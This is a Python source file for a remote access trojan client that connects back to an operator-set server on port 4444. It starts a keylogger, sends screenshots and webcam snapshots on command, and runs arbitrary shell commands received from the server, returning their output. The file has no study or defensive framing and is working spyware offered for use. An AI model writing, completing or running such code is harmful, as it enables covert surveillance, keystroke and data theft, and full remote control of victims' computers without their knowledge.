import socket
import os
import pyautogui
from webcam_module import take_snapshot
from keylogger import start_keylogger
import threading

SERVER_IP = ''   # Change to your server IP
PORT = 4444
PASSWORD = "grandpa123"   # Basic password protection

def send_file(sock, filename):
    if os.path.exists(filename):
        with open(filename, "rb") as f:
            data = f.read()
            sock.sendall(data)
    else:
        sock.send(b"[!] File not found.")

def main():
    start_keylogger()
    s = socket.socket()
    s.connect((SERVER_IP, PORT))

    # Send password first
    s.send(PASSWORD.encode())
    auth_result = s.recv(1024).decode()
    if auth_result != "OK":
        print("[-] Authentication Failed!")
        return

    while True:
        command = s.recv(1024).decode()

        if command == "exit":
            break
        elif command == "screenshot":
            screenshot = pyautogui.screenshot()
            screenshot.save("screen.png")
            send_file(s, "screen.png")
        elif command == "webcam":
            take_snapshot("webcam.jpg")
            send_file(s, "webcam.jpg")
        elif command.startswith("cd "):
            try:
                os.chdir(command.split(" ")[1])
                s.send(b"[+] Directory changed.")
            except:
                s.send(b"[!] Failed to change directory.")
        else:
            output = os.popen(command).read()
            if output:
                s.send(output.encode())
            else:
                s.send(b"[!] No output.")

    s.close()

if __name__ == "__main__":
    main()